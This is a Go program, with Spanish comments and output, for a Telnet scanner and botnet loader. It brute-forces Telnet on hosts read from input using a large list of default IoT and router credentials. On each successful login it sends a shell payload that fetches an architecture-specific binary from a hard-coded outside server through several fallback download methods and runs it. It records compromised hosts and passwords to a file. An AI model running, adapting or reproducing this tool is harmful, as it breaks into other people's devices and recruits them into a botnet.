package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var CREDENTIALS = []struct {
	Username string
	Password string
}{
	{"root", "123456"},
	{"root", "password"},
	{"root", "12345678"},
	{"admin", "admin"},
	{"root", "admin"},
	{"admin", "123456"},
	{"root", "root"},
	{"admin", "password"},
	{"root", "12345"},
	{"root", "123456789"},
	{"admin", "12345"},
	{"root", "1234"},
	{"admin", "1234"},
	{"root", "1234567890"},
	{"admin", "12345678"},
	{"root", "qwerty"},
	{"admin", "admin123"},
	{"root", "admin123"},
	{"admin", "qwerty"},
	{"root", "passw0rd"},
	{"ubnt", "ubnt"},
	{"pi", "raspberry"},
	{"root", "vizxv"},
	{"root", "xc3511"},
	{"root", "anko"},
	{"admin", "1234"},
	{"admin", "password"},
	{"cisco", "cisco"},
	{"enable", "cisco"},
	{"root", "toor"},
	{"root", "alpine"},
	{"root", "changeme"},
	{"admin", "default"},
	{"root", "default"},
	{"support", "support"},
	{"user", "user"},
	{"guest", "guest"},
	{"root", ""},
	{"admin", ""},
	{"root", "root123"},
	{"root", "dreambox"},
	{"root", "recorder"},
	{"root", "hikvision"},
	{"admin", "hikvision"},
	{"root", "pass"},
	{"admin", "meinsm"},
	{"root", "Zte521"},
	{"admin", "Admin"},
	{"root", "Admin"},
	{"Administrator", "password"},
	{"root", "1qaz2wsx"},
	{"root", "q1w2e3r4"},
	{"admin", "1qaz2wsx"},
	{"root", "111111"},
	{"root", "000000"},
	{"root", "123123"},
	{"root", "123321"},
	{"admin", "111111"},
	{"admin", "000000"},
	{"root", "654321"},
	{"root", "666666"},
	{"root", "888888"},
	{"root", "klv123"},
	{"root", "7ujMko0admin"},
	{"root", "7ujMko0vizxv"},
	{"root", "system"},
	{"admin", "system"},
	{"root", "manager"},
	{"admin", "manager"},
	{"root", "super"},
	{"admin", "super"},
	{"root", "2020"},
	{"root", "2021"},
	{"root", "2022"},
	{"root", "2023"},
	{"root", "2024"},
	{"root", "2025"},
	{"root", "2026"},
	{"admin", "2024"},
	{"root", "Password2024"},
	{"root", "Admin2024"},
	{"root", "letmein"},
	{"root", "monkey"},
	{"root", "dragon"},
	{"root", "baseball"},
	{"root", "football"},
	{"root", "master"},
	{"admin", "12345"},
	{"admin", "123456"},
	{"admin", "password"},
	{"admin", "admin1234"},
	{"admin", "Admin123"},
	{"root", "pass123"},
	{"root", "system"},
	{"root", "camera"},
	{"root", "hik12345"},
	{"root", "dahua"},
	{"admin", "dahua"},
	{"root", "Admin123"},
	{"root", "camera123"},
}

const (
	TELNET_TIMEOUT  = 15 * time.Second
	MAX_WORKERS     = 800
	STATS_INTERVAL  = 1 * time.Second
	MAX_QUEUE_SIZE  = 100000
	CONNECT_TIMEOUT = 8 * time.Second
)

// PAYLOAD CORREGIDO - Sin backticks, usando $(uname -m)
const PAYLOAD = `cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || cd /var || cd /;
a=$(uname -m);
if echo "$a" | grep -q "x86_64"; then b="x86_64/x86_64";
elif echo "$a" | grep -q "i[3-6]86"; then b="x86/x86";
elif echo "$a" | grep -q "armv7"; then b="arm7/arm7";
elif echo "$a" | grep -q "armv6"; then b="arm6/arm6";
elif echo "$a" | grep -q "armv5"; then b="arm5/arm5";
elif echo "$a" | grep -q "aarch64"; then b="aarch64/aarch64";
elif echo "$a" | grep -q "mips"; then 
    if echo "$a" | grep -q "el"; then b="mipsel/mipsel"; else b="mips/mips"; fi
else b="x86_64/x86_64";
fi
url="http://172.96.140.62:1283/bots/$b";
if command -v wget >/dev/null 2>&1; then
    wget -q -O .x "$url" 2>/dev/null || wget -O .x "$url" 2>/dev/null;
elif command -v curl >/dev/null 2>&1; then
    curl -s -o .x "$url" 2>/dev/null || curl -o .x "$url" 2>/dev/null;
elif command -v busybox >/dev/null 2>&1; then
    busybox wget -q -O .x "$url" 2>/dev/null || busybox wget -O .x "$url" 2>/dev/null;
elif command -v fetch >/dev/null 2>&1; then
    fetch -q -o .x "$url" 2>/dev/null || fetch -o .x "$url" 2>/dev/null;
elif command -v tftp >/dev/null 2>&1; then
    tftp -g -r "bots/$(basename $b)" -l .x 172.96.140.62 2>/dev/null;
elif command -v ftp >/dev/null 2>&1; then
    echo "open 172.96.140.62 1283
get bots/$(basename $b) .x
quit" | ftp -n 2>/dev/null;
elif echo >/dev/tcp/172.96.140.62/1283 2>/dev/null; then
    exec 3<>/dev/tcp/172.96.140.62/1283 && echo -e "GET /bots/$b HTTP/1.0\r\nHost: 172.96.140.62\r\n\r\n" >&3 && cat <&3 > .x && exec 3<&- 2>/dev/null;
fi
if [ -f .x ]; then
    chmod +x .x 2>/dev/null;
    ./.x;
    echo "LOADER_SUCCESS";
fi`

type CredentialResult struct {
	Host     string
	Username string
	Password string
	Success  bool
}

type TelnetScanner struct {
	lock       sync.Mutex
	scanned    int64
	valid      int64
	invalid    int64
	loaders    int64
	hostQueue  chan string
	done       chan bool
	wg         sync.WaitGroup
	queueSize  int64
	loaderFile *os.File
}

func NewTelnetScanner() *TelnetScanner {
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	f, err := os.OpenFile("loader.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error abriendo loader.txt: %v\n", err)
		return nil
	}
	
	return &TelnetScanner{
		hostQueue:  make(chan string, MAX_QUEUE_SIZE),
		done:       make(chan bool),
		loaderFile: f,
	}
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, *CredentialResult) {
	dialer := &net.Dialer{
		Timeout: CONNECT_TIMEOUT,
	}
	conn, err := dialer.Dial("tcp", host+":23")
	if err != nil {
		return false, nil
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(TELNET_TIMEOUT))

	// Leer banner inicial
	buf := make([]byte, 2048)
	initial := ""
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	if n, _ := conn.Read(buf); n > 0 {
		initial = string(buf[:n])
	}

	// Si ya tiene prompt, enviar directamente
	if strings.Contains(initial, "#") || strings.Contains(initial, "$") || strings.Contains(initial, ">") {
		conn.Write([]byte(PAYLOAD + "\n"))
		time.Sleep(12 * time.Second)
		
		output := ""
		for i := 0; i < 30; i++ {
			conn.SetReadDeadline(time.Now().Add(1 * time.Second))
			if n, err := conn.Read(buf); err == nil && n > 0 {
				output += string(buf[:n])
			}
		}
		
		success := strings.Contains(output, "LOADER_SUCCESS")
		return true, &CredentialResult{
			Host:     host,
			Username: username,
			Password: password,
			Success:  success,
		}
	}

	// Login normal
	data := make([]byte, 0, 1024)
	data = append(data, []byte(initial)...)
	
	// Buscar login prompt
	loginAttempts := 0
	for !bytes.Contains(data, []byte("login:")) && 
		  !bytes.Contains(data, []byte("Login:")) &&
		  !bytes.Contains(data, []byte("username:")) &&
		  !bytes.Contains(data, []byte("Username:")) &&
		  loginAttempts < 20 {
		
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		n, err := conn.Read(buf)
		if err != nil {
			conn.Write([]byte("\n"))
			loginAttempts++
			continue
		}
		data = append(data, buf[:n]...)
	}

	// Enviar username
	conn.Write([]byte(username + "\n"))
	
	// Buscar password prompt
	data = nil
	passAttempts := 0
	for !bytes.Contains(data, []byte("Password:")) && 
		  !bytes.Contains(data, []byte("password:")) &&
		  passAttempts < 15 {
		
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		n, err := conn.Read(buf)
		if err != nil {
			continue
		}
		data = append(data, buf[:n]...)
		passAttempts++
	}

	// Enviar password
	conn.Write([]byte(password + "\n"))
	
	// Esperar shell
	time.Sleep(3 * time.Second)
	
	// Limpiar buffer
	for i := 0; i < 5; i++ {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		conn.Read(buf)
	}
	
	// Enviar payload
	conn.Write([]byte(PAYLOAD + "\n"))
	time.Sleep(12 * time.Second)
	
	// Leer respuesta
	output := ""
	for i := 0; i < 30; i++ {
		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		if n, err := conn.Read(buf); err == nil && n > 0 {
			output += string(buf[:n])
		}
	}
	
	success := strings.Contains(output, "LOADER_SUCCESS")
	
	return true, &CredentialResult{
		Host:     host,
		Username: username,
		Password: password,
		Success:  success,
	}
}

func (s *TelnetScanner) saveLoader(host, username, password string) {
	s.lock.Lock()
	defer s.lock.Unlock()
	
	line := fmt.Sprintf("%s:%s:%s\n", host, username, password)
	s.loaderFile.WriteString(line)
	s.loaderFile.Sync()
}

func (s *TelnetScanner) worker() {
	defer s.wg.Done()

	for host := range s.hostQueue {
		atomic.AddInt64(&s.queueSize, -1)
		atomic.AddInt64(&s.scanned, 1)
		
		if host == "" {
			continue
		}
		
		for _, cred := range CREDENTIALS {
			success, result := s.tryLogin(host, cred.Username, cred.Password)
			if success {
				atomic.AddInt64(&s.valid, 1)
				
				if result.Success {
					atomic.AddInt64(&s.loaders, 1)
					s.saveLoader(result.Host, result.Username, result.Password)
					fmt.Printf("\n🔥 LOADER: %s | %s:%s\n", 
						result.Host, result.Username, result.Password)
				}
				break
			}
		}
	}
}

func (s *TelnetScanner) statsThread() {
	ticker := time.NewTicker(STATS_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-s.done:
			return
		case <-ticker.C:
			scanned := atomic.LoadInt64(&s.scanned)
			valid := atomic.LoadInt64(&s.valid)
			invalid := atomic.LoadInt64(&s.invalid)
			loaders := atomic.LoadInt64(&s.loaders)
			queueSize := atomic.LoadInt64(&s.queueSize)
			
			fmt.Printf("\r📊 Escaneados: %d | ✅ Logins: %d | ❌ Fallos: %d | 🔥 Loaders: %d | Cola: %d", 
				scanned, valid, invalid, loaders, queueSize)
		}
	}
}

func (s *TelnetScanner) Run() {
	defer s.loaderFile.Close()
	
	fmt.Println("╔════════════════════════════════════════╗")
	fmt.Println("║     TELNET SCANNER - LOADER TRACKER    ║")
	fmt.Println("║     (PAYLOAD CORREGIDO - SIN BACKTICKS)║")
	fmt.Println("╚════════════════════════════════════════╝")
	fmt.Printf("Workers: %d\n", MAX_WORKERS)
	fmt.Printf("Servidor: 172.96.140.62:1283\n")
	fmt.Printf("Formatos: x86/x86, x86_64/x86_64, arm7/arm7, arm6/arm6, mips/mips, mipsel/mipsel\n\n")
	
	go s.statsThread()

	stdinDone := make(chan bool)
	
	go func() {
		reader := bufio.NewReader(os.Stdin)
		hostCount := 0
		
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}
			
			host := strings.TrimSpace(line)
			if host != "" && net.ParseIP(host) != nil {
				atomic.AddInt64(&s.queueSize, 1)
				hostCount++
				s.hostQueue <- host
			}
		}
		
		fmt.Printf("\n📥 Hosts cargados: %d\n", hostCount)
		stdinDone <- true
	}()

	for i := 0; i < MAX_WORKERS; i++ {
		s.wg.Add(1)
		go s.worker()
	}

	<-stdinDone
	close(s.hostQueue)
	s.wg.Wait()
	s.done <- true

	loaders := atomic.LoadInt64(&s.loaders)
	
	fmt.Printf("\n\n✅ Scan completado\n")
	fmt.Printf("🔥 Loaders: %d (guardados en loader.txt)\n", loaders)
}

func main() {
	scanner := NewTelnetScanner()
	if scanner != nil {
		scanner.Run()
	}
}
